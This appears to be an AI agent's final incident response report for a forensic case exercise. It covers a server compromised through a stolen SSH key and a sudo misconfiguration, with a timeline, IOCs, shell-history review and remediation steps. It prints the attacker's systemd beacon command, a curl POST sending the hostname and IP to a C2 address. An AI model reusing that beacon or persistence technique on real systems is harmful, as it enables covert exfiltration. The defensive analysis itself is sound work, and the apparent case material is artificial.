All 8 claims accepted. Here is the final report.

---

# Incident Response Report — webserver-prod-02

## Executive Summary

The production web server **webserver-prod-02** was compromised on **April 14** via the **deploy** service account. An attacker authenticated from a known C2 IP address (185.229.59.103) using a stolen SSH public key, then leveraged the account's overly permissive NOPASSWD sudo access to `systemctl` to install a persistent command-and-control beacon as a systemd service. The beacon phones home to the same attacker IP every 10 minutes.

## Timeline of Attack

| Time (Apr) | Event | Evidence |
|---|---|---|
| 13 08:15–16:42 | Normal operations — deploy, alice, bob log in from internal IPs and perform routine work | auth.log lines 3–28 |
| **14 03:17:44** | deploy logs in from **185.229.59.103** via publickey | auth.log line 30 |
| 14 03:18:02 | Attacker reads /etc/passwd via sudo | auth.log line 32 |
| 14 03:18:12 | Attacker copies /tmp/update to /usr/local/bin/update via sudo | auth.log line 35 |
| 14 03:18:17 | Attacker makes it executable (chmod +x) | auth.log line 36 |
| 14 03:18:29 | Attacker writes system-updater.service via sudo tee | auth.log line 37 |
| 14 03:18:44 | systemctl daemon-reload | auth.log line 38 |
| 14 03:18:58 | systemctl enable system-updater.service | auth.log line 39 |
| 14 03:19:03 | systemctl start system-updater.service | auth.log line 40 |
| 14 08:25–10:03 | Normal activity resumes from internal IPs (deploy, bob) | auth.log lines 44–48 |

## Findings

### 1. Initial Access (Inference)
The attacker authenticated as `deploy` from **185.229.59.103** at 03:17:44 on April 14 using SSH publickey authentication. No brute force or password guessing was observed — this implies the attacker possessed a valid private SSH key for the deploy account. The deploy account has two authorized keys: `deploy@ci-runner-1` and `deploy@ci-backup`.

### 2. C2 Beacon Persistence (Confirmed)
A malicious systemd unit **system-updater.service** was installed at `etc/systemd/system/system-updater.service`. It runs as root and executes:
```
/usr/bin/curl -sX POST https://185.229.59.103:8443/beacon -d "host=$(hostname)&ip=$(hostname -I)"
```
It restarts every 600 seconds (10 minutes), leaking the hostname and IP to the attacker's C2 server.

### 3. C2 IP Confirmed Malicious (Confirmed)
IP **185.229.59.103** is classified as a **C2 server** by threat intelligence (high confidence).

### 4. Privilege Escalation via Sudoers Misconfiguration (Confirmed)
The deploy account has a sudoers entry (`etc/sudoers.d/deploy`) granting `NOPASSWD: /usr/bin/systemctl` as root. This overly broad grant allowed the attacker to install, enable, and start the malicious service without any password prompt. The attacker also used sudo for `cat`, `cp`, `chmod`, and `tee` — suggesting deploy may have broader sudo access than just systemctl, or that these were also permitted.

### 5. Suspicious Binary Dropped (Confirmed)
The attacker copied `/tmp/update` to `/usr/local/bin/update` and made it executable (auth.log lines 35-36). This binary's purpose is unknown — /tmp/update was not present in the filesystem snapshot at the time of capture.

### 6. No Webshells, No Account Creation, No Brute Force
- No webshells found in web roots
- No user accounts were created or deleted
- No failed login attempts in the auth log
- No AI/agent signatures detected
- sshd_config is properly hardened (no root login, no password auth)

## Shell History Analysis

### 7. Accounts Analyzed
Three shell history files were found and analyzed:

- **root** — `root/.bash_history` (80 bytes, 4 commands): `apt update`, `apt upgrade`, `systemctl restart nginx`, `tail -f /var/log/nginx/error.log`. Routine sysadmin activity. Nothing suspicious.
- **deploy** — `home/deploy/.bash_history` (264 bytes, 15 commands): `git pull`, `npm ci`, `npm run build`, `npm test`, `curl -sS https://registry.npmjs.org/`, `git status`, `git log`, `systemctl status nginx`, `journalctl -u nginx`, `git push`, `docker ps`, `cd`, `ls`, `cat package.json`, `exit`. Normal CI/CD workflow. Nothing suspicious.
- **alice** — `home/alice/.bash_history` (123 bytes, 6 commands): `ls`, `cd /var/log`, `tail -n 100 nginx/access.log`, `sudo journalctl -u nginx`, `sudo systemctl status nginx`, `exit`. Routine log review. Nothing suspicious.
- **bob** — No home directory or shell history file exists in the filesystem snapshot, though bob logged in twice per auth.log (from 10.0.2.22).

### 8. Key Observation on Shell Histories
The attacker's malicious commands executed during the Apr 14 03:17–03:19 session are **not** present in deploy's `.bash_history`. The malicious activity (reading /etc/passwd, dropping a binary, installing the C2 service) was performed entirely via `sudo` and is captured only in the auth.log sudo entries (lines 32–40). This is consistent with an automated/scripted attack or a non-interactive session that did not write to the bash history file.

## IOCs

| Type | Value | Classification |
|---|---|---|
| IP | 185.229.59.103 | C2 server (high confidence) |
| URL | https://185.229.59.103:8443/beacon | C2 beacon endpoint |
| File | /usr/local/bin/update | Dropped binary (unknown payload) |
| Systemd unit | system-updater.service | Persistence mechanism |

## Recommendations

1. **Immediate**: Stop and disable `system-updater.service`; remove the unit file
2. **Immediate**: Revoke all SSH keys for the deploy account and issue new ones
3. **Immediate**: Remove or quarantine `/usr/local/bin/update` after capturing a copy for analysis
4. **Immediate**: Block 185.229.59.103 at the network perimeter
5. **Short-term**: Restrict deploy's sudoers entry to specific systemctl subcommands (e.g., `systemctl restart nginx` only), not bare `systemctl`
6. **Short-term**: Investigate how the deploy SSH private key was compromised (check ci-runner-1 and ci-backup hosts)
7. **Short-term**: Audit all hosts that 185.229.59.103 may have contacted

---

## Case Questions

**Case Q1:** Shell histories were analyzed for three accounts: **root**, **deploy**, and **alice**. Bob had no home directory or shell history file in the filesystem snapshot (though bob logged in per the auth log). All three histories contained only benign, routine commands.

**Case Q2:** None of the three shell histories show what the attacker did. The attacker's malicious activity — reading `/etc/passwd`, dropping a binary at `/usr/local/bin/update`, and installing a C2 beacon systemd service (`system-updater.service`) — was performed via sudo under the **deploy** account and is captured only in the **auth.log** sudo entries (lines 32–40, Apr 14 03:17–03:19 session from 185.229.59.103). Deploy's `.bash_history` contains only normal CI/CD commands (git, npm, docker) and does not record the attack.